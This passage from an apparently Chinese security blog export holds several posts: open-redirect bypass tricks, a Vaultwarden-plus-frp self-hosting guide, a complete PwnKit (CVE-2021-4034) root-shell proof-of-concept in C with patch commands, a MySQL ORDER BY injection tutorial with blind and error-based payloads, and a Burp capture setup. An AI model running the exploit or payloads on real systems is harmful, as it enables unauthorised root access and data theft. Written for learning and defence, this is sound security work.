<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.aaa.com/acb?Url=http://test.com.login.aaa.com</span><br></pre></td></tr></table></figure>

<h3 id="0x1-利用-绕过URL限制"><a href="#0x1-利用-绕过URL限制" class="headerlink" title="0x1 利用@绕过URL限制"></a>0x1 利用@绕过URL限制</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.aaa.com/acb?Url=http://login.aaa.com@test.com</span><br></pre></td></tr></table></figure>

<h3 id="0x2-利用白名单缺陷绕过限制"><a href="#0x2-利用白名单缺陷绕过限制" class="headerlink" title="0x2 利用白名单缺陷绕过限制"></a>0x2 利用白名单缺陷绕过限制</h3><p>只要包含了某个域名即可跳转，这样我们可以申请一个以其域名为子域名的域名去绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目标域名：aaa.com</span><br><span class="line">我们的域名：bbb.com</span><br><span class="line">http://www.aaa.com/acb?Url=http://login.aaa.com.bbb.com</span><br></pre></td></tr></table></figure>

<h3 id="0x3-多重验证-跳转绕过限制"><a href="#0x3-多重验证-跳转绕过限制" class="headerlink" title="0x3 多重验证&amp;跳转绕过限制"></a>0x3 多重验证&amp;跳转绕过限制</h3><p>现在很多网站都有多重验证，比如你登陆账户后会出现另一个验证页面，输入手机验证码进行验证，此时这上面的URL很可能存在任意跳转的问题。<br>多重跳转的问题导致可绕过URL限制<br>比如<a href="http://www.aaa.com/acb?Url=http">http://www.aaa.com/acb?Url=http</a>: … ttp:&#x2F;&#x2F;login.aaa.com<br>当然，还有多重的，这个结构的多重跳转你修改最后面的URL就可以达到任意URL跳转，中间的URL就没必要动了。</p>
<h3 id="0x4-点击触发达到绕过URL跳转限制"><a href="#0x4-点击触发达到绕过URL跳转限制" class="headerlink" title="0x4 点击触发达到绕过URL跳转限制"></a>0x4 点击触发达到绕过URL跳转限制</h3><p>比如很多登陆页面的地方，其URL是一个跳转的URL<br>如：<a href="http://www.aaa.com/acb?Url=http://test.com">http://www.aaa.com/acb?Url=http://test.com</a><br>你直接修改了后面为任意URL，但是还是停留在原地，似乎没什么问题，但是，当你输入账号和密码后点击登陆按钮后，就会触发跳转。<br>当然，这个账户和密码不一定要对的，随便都可以，但得视系统而定吧。<br>这个我遇到了很多，比如你修改了域名，然后点击登陆，登陆成功后便可触发跳转，这也是一个比较隐蔽的绕过URL限制的跳转。</p>
<h3 id="0x5-利用xip-io绕过"><a href="#0x5-利用xip-io绕过" class="headerlink" title="0x5 利用xip.io绕过"></a>0x5 利用xip.io绕过</h3><p>这个我还没有在测试中应用过，其请求是<a href="http://www.127.0.0.1.xip.io/">http://www.127.0.0.1.xip.io</a> 这个绕过是在SSRF场景中的绕过，比如SSRF你要读取内网地址，一般都做了限制，可以尝试用这方法进行绕过限制，从而访问到内网。<br>另外一点，URL跳转涉及的安全问题大家常见的就是钓鱼，那么利用这个思路也可达成一个钓鱼问题，如，<a href="http://www.qq.com.220.181.57.217.xip.io/">http://www.qq.com.220.181.57.217.xip.io</a><br>当你访问qq这个域名时，其实这个链接已经被解析到后面这个ip地址上了，那么实际访问的就是后面这个IP地址。</p>
<h3 id="0x6-利用超链接绕过可信站点限制"><a href="#0x6-利用超链接绕过可信站点限制" class="headerlink" title="0x6 利用超链接绕过可信站点限制"></a>0x6 利用超链接绕过可信站点限制</h3><p>比如一个URL，它是可以直接跳转的，但是一般测试跳转时大家习惯用<a href="http://www.baidu.com或qq.com这样的可信站点进行测试,但是有些网站是可以跳转这些网站的./">www.baidu.com或qq.com这样的可信站点进行测试，但是有些网站是可以跳转这些网站的。</a><br>只要是可信站点且常用，基本都可以跳转，那么这就属于正常的业务逻辑了，难度就这样错失一个URL跳转漏洞了？<br>其实不然，只要你的URL被百度收录过，那么直接搜索你的域名，site:xxx.xxx<br>因为你在百度里点击你的域名，它会先是一个302跳转，而这个302跳转就是百度下的302跳转，那么这样就可以绕过可信站点的限制，从而达到跳转到指定URL。<br>当然，百度这个302有点长，你给它进行加密就行。</p>
<h3 id="0x7-POST参数中的URL跳转"><a href="#0x7-POST参数中的URL跳转" class="headerlink" title="0x7 POST参数中的URL跳转"></a>0x7 POST参数中的URL跳转</h3><p>当然，这个影响就很小了，比如当你填什么表格或者需要填写什么的，当你上传图片，点击下一步的时候，通常下一步就是预览你填写的信息，最后才是提交。<br>当你上传了图片后点击下一步抓包，如果过滤不严，你会看到图片的完整地址包含在POST参数里，你就可以直接修改这个地址为任意URL，然后到达下一步。<br>这时是确定信息也就是预览自己填写的信息的正确还是不正确，由于你刚刚修改了图片地址，这里是没有显示出来的，图像会是一个小XX。<br>当点击图片右键选择查看图像时，就会触发URL跳转问题，其实这个也可以利用来进行钓鱼，钓后台审核员的信息。<br>为什么呢，比如审核看到图片无法加载，一般都会点击查看图片，然后跳转，如果安全意识不知就会造成安全影响。<br>当然，如果POST参数里就只是URL跳转参数，那么你可以给它转成GET方式，然后进行跳转就可以了，只要网站支持这样的GET方式就行。<br>在Burp Suite里可以一键转换提交方式，右键选择Change request method就可以！</p>
<h3 id="0x8-利用-号绕过"><a href="#0x8-利用-号绕过" class="headerlink" title="0x8 利用#号绕过"></a>0x8 利用#号绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.aaa.com/acb?Url=http://test.com#login.aaa.com</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>bitwarden + frp 自建服务器</title>
    <url>/2024/09/10/bitwarden-frp-%E8%87%AA%E5%BB%BA%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<p>docker在自家的虚拟机里通过frp代理到公网进行访问。</p>
<h3 id="0x1-安装docker"><a href="#0x1-安装docker" class="headerlink" title="0x1 安装docker"></a>0x1 安装docker</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># yum update -y</span><br><span class="line"># yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line"># yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line"># yum install docker-ce docker-ce-cli conntainerd.io</span><br><span class="line"># systemctl enable docker</span><br><span class="line"># systemctl start docker</span><br><span class="line"># docker version  //查看版本，确认安装成功</span><br></pre></td></tr></table></figure>


<h3 id="0x2-安装docker-compose"><a href="#0x2-安装docker-compose" class="headerlink" title="0x2 安装docker-compose"></a>0x2 安装docker-compose</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># sudo curl -L &quot;https://github.com/docker/compose/releases/download/2.16.0/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</span><br><span class="line">//这条命令我这一直失败，我直接去仓库看了一下版本拉取了</span><br><span class="line"># curl -L &quot;https://github.com/docker/compose/releases/download/v2.16.0/docker-compose-linux-x86_64&quot; -o /usr/local/bin/docker-compose</span><br><span class="line"># chmod +x /usr/local/bin/docker-compose</span><br><span class="line"># docker-compose version    //查看版本确认安装成功</span><br></pre></td></tr></table></figure>

<h3 id="0x3-部署"><a href="#0x3-部署" class="headerlink" title="0x3 部署"></a>0x3 部署</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cd ~</span><br><span class="line"># mkdir bitwarden</span><br><span class="line"># cd bitwarden</span><br><span class="line"># vim  docker-compose.yml</span><br></pre></td></tr></table></figure>

<p>填入如下内容 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># docker-compose.yml</span><br><span class="line">version: &#x27;3&#x27;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  bitwarden:</span><br><span class="line">    image: vaultwarden/server:latest</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - 8000:80</span><br><span class="line">    volumes:</span><br><span class="line">      - ./bw-data:/data</span><br><span class="line">    environment:</span><br><span class="line">      WEBSOCKET_ENABLED: &#x27;true&#x27; # Required to use websockets</span><br><span class="line">      SIGNUPS_ALLOWED: &#x27;true&#x27;   # set to false to disable signups</span><br></pre></td></tr></table></figure>

<p>拉取摬像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># sudo docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>官方文档提供多种方式使用HTTPs访问，这里我们采用nginx反向代理+自签名证书的方式来进行HTTPs访问</p>
<h3 id="0x4-安装nginx"><a href="#0x4-安装nginx" class="headerlink" title="0x4 安装nginx"></a>0x4 安装nginx</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># yum install nginx -y</span><br><span class="line"># systemctl start nginx</span><br></pre></td></tr></table></figure>


<h3 id="0x5-安装mkcert并生成证书"><a href="#0x5-安装mkcert并生成证书" class="headerlink" title="0x5 安装mkcert并生成证书"></a>0x5 安装mkcert并生成证书</h3><h4 id="安装mkcert"><a href="#安装mkcert" class="headerlink" title="安装mkcert"></a>安装mkcert</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># git clone https://github.com/FiloSottile/mkcert &amp;&amp; cd mkcert</span><br><span class="line">//我采用的是编译的方式，所以还要安装golang</span><br><span class="line"># yum install golang</span><br><span class="line"># cd mkcert/</span><br><span class="line"># go build -ldflags &quot;-X main.Version=$(git describe --tags)&quot;</span><br></pre></td></tr></table></figure>
<p>官方还提供了其它的安装方式，根据自己的环境选择，参与：<br><a href="https://github.com/FiloSottile/mkcert">https://github.com/FiloSottile/mkcert</a></p>
<h4 id="生成自签名证书"><a href="#生成自签名证书" class="headerlink" title="生成自签名证书"></a>生成自签名证书</h4><p>域名理论上随便输，不行就和nginx server_name相同就行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkcert o0x1055.com &quot;*.o0x1055.com&quot; localhost 127.0.0.1 ::1</span><br></pre></td></tr></table></figure>

<p>执行此命令后会在当前目录生成两个文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">o0x1055.com+4-key.pem</span><br><span class="line">o0x1055.com+4.pem</span><br></pre></td></tr></table></figure>

<p>把这两文件放到全适的位置，我放到了&#x2F;etc&#x2F;nginx&#x2F;ssl</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># mkdir -p /etc/nginx/ssl</span><br><span class="line">mv o0x1055.com* /etc/nginx/ssl</span><br></pre></td></tr></table></figure>


<h4 id="编辑nginx配置文件"><a href="#编辑nginx配置文件" class="headerlink" title="编辑nginx配置文件"></a>编辑nginx配置文件</h4><p>&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;default.conf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 443;</span><br><span class="line">    server_name o0x1055.com;</span><br><span class="line">    ssl on;</span><br><span class="line"></span><br><span class="line">    ssl_certificate /etc/nginx/ssl/o0x1055.com+4.pem;</span><br><span class="line">    ssl_certificate_key /etc/nginx/ssl/o0x1055.com+4-key.pem;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://127.0.0.1:8000; # bitwarden server address</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重启nginx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># systemctl restart nginx</span><br></pre></td></tr></table></figure>

<p>此时访问443，就可以正常访问和注册了<br><img src="/images/blog/f132ea907ff86631acbf51290f16b209.png" alt="1"><br><img src="/images/blog/802178fa7e77d8e0f35791876d211ceb.png" alt="1"></p>
<h3 id="0x6-端口映射"><a href="#0x6-端口映射" class="headerlink" title="0x6 端口映射"></a>0x6 端口映射</h3><p>使用端口映射工具（FRP等）把本地端口映射到公网，即可实现公网的访问了</p>
<h3 id="0x7-certbot申请证书"><a href="#0x7-certbot申请证书" class="headerlink" title="0x7 certbot申请证书"></a>0x7 certbot申请证书</h3><p>添加在域名管理添加一条A记录，指定安装了certbot应用的服务器<br><img src="/images/blog/7432a8645b3ad79ee04fa934b4020c53.png"></p>
<p>然后在指向的服务器执行生成证书</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certbot certonly --standalone  -d bit.elenlen.xyz</span><br></pre></td></tr></table></figure>

<p>把其中的如下两个证书放到frp ssl目录下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ssl/fullchain.pem</span><br><span class="line">./ssl/privkey.pem</span><br></pre></td></tr></table></figure>

<h3 id="0x7-frp设置"><a href="#0x7-frp设置" class="headerlink" title="0x7 frp设置"></a>0x7 frp设置</h3><p>frpc.ini配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 42.193.253.66</span><br><span class="line">server_port = 7090</span><br><span class="line"></span><br><span class="line">[test_htts2http]</span><br><span class="line">type = https</span><br><span class="line">custom_domains = bit.elenlen.xyz</span><br><span class="line"></span><br><span class="line">plugin = https2http</span><br><span class="line">plugin_local_addr = 127.0.0.1:8000</span><br><span class="line"></span><br><span class="line">plugin_crt_path = ./ssl/fullchain.pem</span><br><span class="line">plugin_key_path = ./ssl/privkey.pem</span><br><span class="line">plugin_host_header_rewrite = 127.0.0.1</span><br><span class="line">plugin_header_X-From-Where = like</span><br></pre></td></tr></table></figure>

<p>frps.ini配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7090</span><br><span class="line">vhost_https_port = 7099</span><br><span class="line">dashboard_port = 7500</span><br><span class="line"># dashboard&#x27;s username and password are both optional</span><br><span class="line">dashboard_user = admin</span><br><span class="line">dashboard_pwd = ******</span><br></pre></td></tr></table></figure>

<h3 id="0x8-docker命令"><a href="#0x8-docker命令" class="headerlink" title="0x8 docker命令"></a>0x8 docker命令</h3><p>在有docker-compose.yml目录下执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose down //停止容器，删除网络信息等</span><br><span class="line">docker-compose up -d   //根据当前目录的docker-compose.yml文件，启动容器</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux本地提权漏洞（CVE-2021-4034）</title>
    <url>/2024/09/10/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-4034%EF%BC%89/</url>
    <content><![CDATA[<p><a href="https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c">参考</a></p>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) by Andris Raugulis &lt;moo@arthepsy.eu&gt;</span><br><span class="line"> * Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034</span><br><span class="line"> */</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">char *shell = </span><br><span class="line">	&quot;#include &lt;stdio.h&gt;\n&quot;</span><br><span class="line">	&quot;#include &lt;stdlib.h&gt;\n&quot;</span><br><span class="line">	&quot;#include &lt;unistd.h&gt;\n\n&quot;</span><br><span class="line">	&quot;void gconv() &#123;&#125;\n&quot;</span><br><span class="line">	&quot;void gconv_init() &#123;\n&quot;</span><br><span class="line">	&quot;	setuid(0); setgid(0);\n&quot;</span><br><span class="line">	&quot;	seteuid(0); setegid(0);\n&quot;</span><br><span class="line">	&quot;	system(\&quot;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf &#x27;GCONV_PATH=.&#x27; &#x27;pwnkit&#x27;; /bin/sh\&quot;);\n&quot;</span><br><span class="line">	&quot;	exit(0);\n&quot;</span><br><span class="line">	&quot;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">	FILE *fp;</span><br><span class="line">	system(&quot;mkdir -p &#x27;GCONV_PATH=.&#x27;; touch &#x27;GCONV_PATH=./pwnkit&#x27;; chmod a+x &#x27;GCONV_PATH=./pwnkit&#x27;&quot;);</span><br><span class="line">	system(&quot;mkdir -p pwnkit; echo &#x27;module UTF-8// PWNKIT// pwnkit 2&#x27; &gt; pwnkit/gconv-modules&quot;);</span><br><span class="line">	fp = fopen(&quot;pwnkit/pwnkit.c&quot;, &quot;w&quot;);</span><br><span class="line">	fprintf(fp, &quot;%s&quot;, shell);</span><br><span class="line">	fclose(fp);</span><br><span class="line">	system(&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;);</span><br><span class="line">	char *env[] = &#123; &quot;pwnkit&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=PWNKIT&quot;, &quot;SHELL=pwnkit&quot;, NULL &#125;;</span><br><span class="line">	execve(&quot;/usr/bin/pkexec&quot;, (char*[])&#123;NULL&#125;, env);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>我司监测到一则polkit组件存在本地权限提升漏洞的信息，漏洞编号：CVE-2021-4034，该漏洞是由于pkexec在处理传入参数的逻辑出现问题，导致环境变量被污染，最终交由pkexec代码逻辑执行实现客户机权限提升。有普通权限用户的攻击者通过执行漏洞文件，触发越界读写，从而在目标系统上造成权限提升。</p>
<h4 id="漏洞评级"><a href="#漏洞评级" class="headerlink" title="漏洞评级"></a>漏洞评级</h4><p>高危</p>
<h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>所有主流Linux发行版本均受影响</p>
<h4 id="安全版本"><a href="#安全版本" class="headerlink" title="安全版本"></a>安全版本</h4><h5 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h5><p>CentOS 6：polkit-0.96-11.el6_10.2</p>
<p>CentOS 7：polkit-0.112-26.el7_9.1</p>
<p>CentOS 8.0：polkit-0.115-13.el8_5.1</p>
<p>CentOS 8.2：polkit-0.115-11.el8_2.2</p>
<p>CentOS 8.4：polkit-0.115-11.el8_4.2</p>
<h5 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h5><p>Ubuntu 14.04 ESM：policykit-1-0.105-4ubuntu3.14.04.6+esm1</p>
<p>Ubuntu 16.04 ESM：policykit-1-0.105-14.1ubuntu0.5+esm1</p>
<p>Ubuntu 18.04 LTS：policykit-1-0.105-20ubuntu0.18.04.6</p>
<p>Ubuntu 20.04 LTS：policykit-1-0.105-26ubuntu1.2</p>
<p>Ubuntu 21.10：policykit-1-0.105-31ubuntu0.1</p>
<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>CentOS，可采用以下命令升级Polkit至安全版本。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum clean all &amp;&amp; yum makecache &amp;&amp; yum update polkit -y</span><br></pre></td></tr></table></figure>

<p>成功升级后，您可以运行以下命令查看Polkit的版本信息，检查是否为安全版本。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">rpm -qa polkit</span><br></pre></td></tr></table></figure>

<p>Ubuntu，可采用以下命令升级Polkit至安全版本。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">sudo apt-get updatesudo apt-get install policykit-1</span><br></pre></td></tr></table></figure>

<p>成功升级后，您可以运行以下命令查看Polkit的版本信息，检查是否为安全版本。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpkg -l policykit-1</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>MySQL Order By 注入总结</title>
    <url>/2024/09/10/MySQL-Order-By-%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h3 id="注入简单判断"><a href="#注入简单判断" class="headerlink" title="注入简单判断"></a>注入简单判断</h3><p>在早期注入大量存在的时候，利用order by子句进行快速猜解表中的列数，再配合union select语句进行回显。在测试时，测试者可以通过修改order参数值，比如调整为较大的整型数，再依据回显情况来判断具体表中包含的列数。</p>
<p>在不知道列名的情况下可以通过列的的序号来指代相应的列。但是经过测试这里无法做运算，如order&#x3D;3-1 和order&#x3D;2是不一样的。<br><img src="/images/blog/1e2f2fe00dadc64c87e133b1b8a2c987.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.239.2:81/?order=11 错误</span><br><span class="line">http://192.168.239.2:81/?order=1 正常</span><br></pre></td></tr></table></figure>
<h3 id="进一步构造Payload"><a href="#进一步构造Payload" class="headerlink" title="进一步构造Payload"></a>进一步构造Payload</h3><p>前面的判断并不是绝对的，我们需要构造出类似and 1&#x3D;1、and 1&#x3D;2的Payload以便于注入出数据。<br><img src="/images/blog/8e4798bbd60d1e96247982c5de6b0d33.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?order=IF(1=1,name,price) 通过name字段排序</span><br><span class="line">/?order=IF(1=2,name,price) 通过price字段排序</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?order=(CASE+WHEN+(1=1)+THEN+name+ELSE+price+END) 通过name字段排序</span><br><span class="line">/?order=(CASE+WHEN+(1=2)+THEN+name+ELSE+price+END) 通过price字段排序</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?order=IFNULL(NULL,price) 通过price字段排序</span><br><span class="line">/?order=IFNULL(NULL,name) 通过name字段排序</span><br></pre></td></tr></table></figure>
<p>另外利用rand函数也能达到类似的效果，可以观测到排序的结果不一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?order=rand(1=1) </span><br><span class="line">/?order=rand(1=2)</span><br></pre></td></tr></table></figure>
<h3 id="利用报错"><a href="#利用报错" class="headerlink" title="利用报错"></a>利用报错</h3><p>在有些情况下无法知道列名，而且也不太直观的去判断两次请求的差别，如下用IF语句为例。</p>
<p>返回多条记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?order=IF(1=1,1,(select+1+union+select+2)) 正确</span><br><span class="line">/?order=IF(1=2,1,(select+1+union+select+2)) 错误</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?order=IF(1=1,1,(select+1+from+information_schema.tables)) 正常</span><br><span class="line">/?order=IF(1=2,1,(select+1+from+information_schema.tables)) 错误</span><br></pre></td></tr></table></figure>
<h4 id="利用regexp"><a href="#利用regexp" class="headerlink" title="利用regexp"></a>利用regexp</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?order=(select+1+regexp+if(1=1,1,0x00)) 正常</span><br><span class="line">/?order=(select+1+regexp+if(1=2,1,0x00)) 错误</span><br></pre></td></tr></table></figure>
<h4 id="利用updatexml"><a href="#利用updatexml" class="headerlink" title="利用updatexml"></a>利用updatexml</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?order=updatexml(1,if(1=1,1,user()),1) 正确</span><br><span class="line">/?order=updatexml(1,if(1=2,1,user()),1) 错误</span><br></pre></td></tr></table></figure>
<h4 id="利用extractvalue"><a href="#利用extractvalue" class="headerlink" title="利用extractvalue"></a>利用extractvalue</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?order=extractvalue(1,if(1=1,1,user())) 正确</span><br><span class="line">/?order=extractvalue(1,if(1=2,1,user())) 错误</span><br></pre></td></tr></table></figure>
<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>注意如果直接if(1&#x3D;2,1,SLEEP(2))，sleep时间将会变成2当前表中记录的数目，还有比如执行BENCHMARK(1000000,100100);等函数，将会对服务器造成一定的拒绝服务攻击。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) 正常响应时间</span><br><span class="line">/?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) sleep 2秒</span><br></pre></td></tr></table></figure>
<h3 id="数据猜解"><a href="#数据猜解" class="headerlink" title="数据猜解"></a>数据猜解</h3><p>以猜解user()即root@localhost为例子，由于只能一位一位猜解，可以利用SUBSTR,SUBSTRING,MID,以及left和right可以精准分割出每一位子串。然后就是比较操作了可以利用&#x3D;,like,regexp等。这里要注意like是不区分大小写。</p>
<p>通过下可以得知user()第一位为r,ascii码的16进制为0x72：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?order=(select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00)) 正确</span><br><span class="line">/?order=(select+1+regexp+if(substring(user(),1,1)=0x71,1,0x00)) 错误</span><br></pre></td></tr></table></figure>
<h4 id="猜解当前数据库的表名："><a href="#猜解当前数据库的表名：" class="headerlink" title="猜解当前数据库的表名："></a>猜解当前数据库的表名：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?order=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1)=0x67,1,0x00)) 正确</span><br><span class="line">/?order=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1)=0x66,1,0x00)) 错误</span><br><span class="line">````</span><br><span class="line">#### 猜解指定表名中的列名：</span><br></pre></td></tr></table></figure>
<p>&#x2F;?order&#x3D;(select+1+regexp+if(substring((select+concat(column_name)from+information_schema.columns+where+table_schema%3ddatabase()+and+table_name%3d0x676f6f6473+limit+0,1),1,1)&#x3D;0x69,1,0x00)) 正常<br>&#x2F;?order&#x3D;(select+1+regexp+if(substring((select+concat(column_name)from+information_schema.columns+where+table_schema%3ddatabase()+and+table_name%3d0x676f6f6473+limit+0,1),1,1)&#x3D;0x68,1,0x00)) 错误</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap测试</span><br><span class="line">在没有过滤的情况下是能够检测到注入的，如下图：</span><br><span class="line">![](images/blog/1b0c3e91abbd12fa80b6c166364bc83d.png)</span><br><span class="line"></span><br><span class="line">### 附录服务端代码</span><br></pre></td></tr></table></figure>
<?php
error_reporting(0);
session_start();
mysql_connect("127.0.0.1", "root", "root") or die("Database connection failed ");
mysql_select_db("sqlidemo") or die("Select database failed");

$order = $_GET['order'] ? $_GET['order'] : 'name';
$sql = "select id,name,price from goods order by $order";
$result = mysql_query($sql);
$reslist = array();
while($row = mysql_fetch_array($result, MYSQL_ASSOC))
{
 array_push($reslist, $row);
}
echo json_encode($reslist);
create database sqlidemo;
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line">use sqlidemo;</span><br><span class="line">create table goods (id int(4) not null primary key auto_increment, name char(32) not null, price int(4) not null);</span><br><span class="line">insert into goods (name, price) values(&quot;apple&quot;, 10);</span><br><span class="line">insert into goods (name, price) values(&quot;banana&quot;, 15);</span><br><span class="line">insert into goods (name, price) values(&quot;peach&quot;, 20);</span><br></pre></td></tr></table></figure>
### 修复建议
这个问题的是由于攻击者通过测试，了解到应用程序对数据对象进行了直接引用。该类问题可以归纳到OWASP-2013中A4（不安全的对象直接引用）。常见的修复方法如下：

* 通过正则表达式进行字符串过滤。只允许字段中出现字母、数字、下划线。
* 通过白名单思路，使用间接对象引用。前端传递引用数字或者字符串等，用于与后端做数组映射，这样可以隐藏数据库数据字典效果，避免直接引用带来的危害。
<?php 
$orderby_whitelist = array(  
  "apple" => "apple ASC",  
  "applerev" => "apple DESC", 
  "daterev" => "banana DESC", 
  "DEFAULT" => "peach"
); 
$order = isset($_GET["order"]) ? $_GET["order"] : "DEFAULT";
$order_expr = array_key_exists($order, $orderby_whitelist) ? $orderby_whitelist[$order] : $orderby_whitelist["DEFAULT"]; 
mysql_query("SELECT ... FROM ... ORDER BY $order_expr");
参考资料]]></content>
  </entry>
  <entry>
    <title>burpsuit+proxifier+PC抓取小程序包</title>
    <url>/2024/09/10/burpsuit-proxifier-PC%E6%8A%93%E5%8F%96%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8C%85/</url>
    <content><![CDATA[<h3 id="0x1-准备"><a href="#0x1-准备" class="headerlink" title="0x1 准备"></a>0x1 准备</h3><ul>
<li>proxifier</li>
<li>burpsuit</li>
<li>小程序的程序名【WeChatAppEx.exe】</li>
</ul>
<h3 id="0x2-Proxifier-设置"><a href="#0x2-Proxifier-设置" class="headerlink" title="0x2 Proxifier 设置"></a>0x2 Proxifier 设置</h3><p><strong>A.设置代理服务器</strong></p>
<p>菜单导航【profile】 -&gt; 【Proxy Servers】<br><img src="/images/blog/71ee3e9b8d7bce115585d47e13c93a1c.png"></p>
<p>添加如下三个选项</p>
<blockquote>
<p>注意：这里的【Address】要和burpsuit同步，这里是本机IP burpsuit也要监听本机IP</p>
</blockquote>
<p><img src="/images/blog/5d70009389d312343fdd0c008f7aaa44.png"></p>
<p>这里会有个问题，HTTP 可能无法设置，按如下操作，打开HTTP代理支持<br><img src="/images/blog/ea42d7dd90de3a02dd0eacff92b5f405.png"><br><img src="/images/blog/f7d2521cb561b296b766084d0e75cf8c.png"></p>
